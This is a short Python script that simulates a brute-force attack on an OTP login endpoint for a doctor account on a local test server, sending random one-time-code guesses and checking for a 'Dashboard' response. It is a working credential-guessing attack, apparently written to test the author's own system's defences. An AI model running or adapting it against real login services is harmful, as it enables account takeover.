import requests # type: ignore
import secrets
import time

# DISCLAIMER: This script is for my authorized testing on my system.
# This script is not to be used to attack systems without explicit permission.

# Configuration for the brute-force simulation
target_url = "http://127.0.0.1:5000/auth/login/doctor"  # Endpoint for OTP login (adjust as needed)
staff_id = "DOC001"  # A valid staff_id for testing; must be pre-registered in the test system
attempts = 20  # Number of OTP attempts for demonstration; adjust as needed

def brute_force_otp(target_url, staff_id, attempts):
    """
    Simulate a brute-force attack on the OTP verification endpoint.
    
    For each attempt, generate a random OTP (6-digit hex) and send a POST request.
    If the response indicates a successful login (e.g., contains 'Dashboard' in the text),
    then print the found OTP and stop further attempts.
    """
    session = requests.Session()  # Maintain a session if needed (for cookies, etc.)
    
    for i in range(1, attempts + 1):
        otp_guess = secrets.token_hex(3)  # Generate a 6-digit hexadecimal OTP
        payload = {
            "staff_id": staff_id,
            "otp": otp_guess
        }
        
        try:
            response = session.post(target_url, data=payload, timeout=5)
        except requests.exceptions.RequestException as e:
            print(f"Request error on attempt {i}: {e}")
            continue
        
        # For demonstration, we assume a successful response includes "Dashboard"
        # (Adjust the success criteria according to your application's response format)
        if "Dashboard" in response.text:
            print(f"Successful OTP found on attempt {i}: {otp_guess}")
            return otp_guess
        
        if i % 100 == 0:  # Print progress every 100 attempts
            print(f"Attempt {i}: Latest OTP guess = {otp_guess}")
        # Optional: slow down requests to mimic realistic timing and avoid overwhelming the server
        time.sleep(0.1)
    
    print("Brute force attempts completed. No successful OTP found.")
    return None

if __name__ == '__main__':
    brute_force_otp(target_url, staff_id, attempts)
